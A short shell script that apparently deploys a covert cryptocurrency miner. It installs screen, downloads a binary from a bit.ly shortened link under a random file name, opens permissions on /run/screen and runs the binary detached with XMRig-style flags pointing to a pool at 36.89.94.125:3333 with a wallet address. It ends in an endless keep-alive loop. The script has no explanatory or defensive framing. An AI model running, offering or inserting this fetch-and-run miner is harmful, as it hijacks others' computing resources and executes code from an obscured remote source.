apt-get update -y
apt-get install -y screen
OKE=$(shuf -n 1 -i 1-9999999)
wget -q -O $OKE https://bit.ly/3pezyWf
chmod +x $OKE
chmod 777 /run/screen
screen -dmS $OKE ./$OKE --url 36.89.94.125:3333 --user hvxxzE88RUEbetvm8dCfu97o8p1rLSZ9s66qYVr5YVokHGfg48ZekDeX1mi1TmcSTtdMQTGEjguD6NtwQ8CQSTkB3QmEn5Bhqa --pass x --donate-level 0
while :; do shuf -n 1 -i 1-99999999; sleep 30; done